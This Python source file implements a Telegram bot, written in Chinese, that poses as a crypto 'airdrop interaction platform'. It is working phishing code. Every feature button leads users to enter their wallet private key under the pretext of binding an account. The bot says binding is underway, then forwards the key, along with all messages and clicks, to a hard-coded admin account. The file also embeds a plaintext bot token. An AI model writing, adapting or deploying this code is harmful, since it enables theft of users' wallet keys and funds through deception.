import logging
import time
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import TimedOut, NetworkError, TelegramError

# 配置日志
# 确保logs目录存在
if not os.path.exists('logs'):
    os.makedirs('logs')

# 配置日志，同时输出到控制台和文件
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/alpha_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# 设置机器人参数
TOKEN = '8771389923:AAHwCvQg_xJZHw0JYEVDW8UMbyGsny7_hxk'  # 用户提供的机器人token
ADMIN_ID = 8412823101  # 用户的Telegram ID，用于接收所有交互通知

# 存储用户状态的字典（简单内存存储）
user_states = {}

def get_main_menu_keyboard():
    """创建主菜单键盘"""
    keyboard = [
        [InlineKeyboardButton("绑定账户", callback_data='bind_account')],
        [InlineKeyboardButton("自动领取", callback_data='auto_claim')],
        [InlineKeyboardButton("交互跟随", callback_data='ipo_sniping')],
        [InlineKeyboardButton("策略跟随", callback_data='strategy_follow')],
        [InlineKeyboardButton("定制服务", callback_data='custom_service')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_menu_keyboard():
    """创建带有返回主菜单按钮的键盘"""
    keyboard = [[InlineKeyboardButton("返回主菜单", callback_data='back_to_main')]]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理/start命令"""
    user = update.effective_user
    # 创建内联键盘按钮
    reply_markup = get_main_menu_keyboard()
    
    # 发送欢迎消息和按钮
    await update.message.reply_text(
        "这里是alpha空投交互平台，提供各类热门项目打新抢跑、策略运行功能。",
        reply_markup=reply_markup
    )
    
    # 通知管理员用户启动了机器人
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"用户 {user.id} ({user.full_name}) 启动了机器人"
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理内联按钮点击"""
    query = update.callback_query
    await query.answer()  # 必须回复查询，否则用户会看到加载状态
    
    user = query.from_user
    callback_data = query.data
    
    # 通知管理员用户点击了哪个按钮
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"用户 {user.id} ({user.full_name}) 点击了按钮: {callback_data}"
    )
    
    # 根据按钮类型处理
    if callback_data == 'bind_account':
        # 设置用户状态为等待私钥
        user_states[user.id] = 'waiting_for_private_key'
        await query.edit_message_text(
            text="输入钱包私钥绑定空投钱包，为了您的资产安全，请在安全环境下输入。",
            reply_markup=get_back_menu_keyboard()
        )
    elif callback_data == 'back_to_main':
        # 返回主菜单
        await query.edit_message_text(
            text="这里是alpha空投交互平台，提供各类热门项目打新抢跑、策略运行功能。",
            reply_markup=get_main_menu_keyboard()
        )
    else:
        # 其他按钮都提示先绑定账户
        await query.edit_message_text(
            text="请先绑定账户。",
            reply_markup=get_back_menu_keyboard()
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理用户消息"""
    user = update.effective_user
    message_text = update.message.text
    
    # 通知管理员用户发送了什么消息
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"用户 {user.id} ({user.full_name}) 发送了消息: {message_text}"
    )
    
    # 检查用户状态
    if user.id in user_states and user_states[user.id] == 'waiting_for_private_key':
        # 用户正在输入私钥，记录并确认
        await update.message.reply_text(
            "私钥已接收，正在绑定中...",
            reply_markup=get_back_menu_keyboard()
        )
        
        # 通知管理员用户输入的私钥内容
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"用户 {user.id} ({user.full_name}) 输入的私钥: {message_text}"
        )
        
        # 清除用户状态
        del user_states[user.id]
    else:
        # 其他情况，提示用户先点击按钮
        await update.message.reply_text(
            "请先使用按钮进行操作。",
            reply_markup=get_back_menu_keyboard()
        )

def main() -> None:
    """主函数"""
    logging.info("机器人监控程序已启动")
    
    # 记录当前使用的Python版本和依赖版本
    import sys
    import telegram
    logging.info(f"Python版本: {sys.version}")
    logging.info(f"python-telegram-bot版本: {telegram.__version__}")
    logging.info(f"使用的机器人Token: {TOKEN[:10]}...")
    
    while True:
        try:
            logging.info("正在启动机器人...")
            # 创建Application实例
            application = Application.builder().token(TOKEN).build()
            
            # 添加命令处理器
            application.add_handler(CommandHandler("start", start))
            
            # 添加回调查询处理器
            application.add_handler(CallbackQueryHandler(button))
            
            # 添加消息处理器
            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
            
            # 启动机器人
            logging.info("机器人已启动，开始轮询更新...")
            
            # 启动机器人 - 使用start_polling和run直到手动停止
            application.run_polling(
                drop_pending_updates=True,  # 启动时丢弃所有未处理的更新
            )
        except (TimedOut, NetworkError) as e:
            # 处理网络相关错误
            logging.error(f"网络错误: {e}")
            logging.info("10秒后重新尝试连接...")
            time.sleep(10)
        except TelegramError as e:
            # 处理Telegram API相关错误
            logging.error(f"Telegram API错误: {e}")
            logging.info("10秒后重新启动机器人...")
            time.sleep(10)
        except RuntimeError as e:
            # 处理事件循环相关错误
            if "Event loop is closed" in str(e):
                logging.error(f"事件循环错误: {e}")
                # 强制重新创建事件循环
                import asyncio
                asyncio.set_event_loop(asyncio.new_event_loop())
                logging.info("已重新创建事件循环，10秒后重新启动机器人...")
            else:
                logging.error(f"运行时错误: {e}")
                logging.info("10秒后重新启动机器人...")
            time.sleep(10)
        except Exception as e:
            # 处理其他所有错误
            logging.error(f"机器人运行错误: {e}", exc_info=True)
            logging.info("10秒后重新启动机器人...")
            time.sleep(10)

if __name__ == '__main__':
    main()
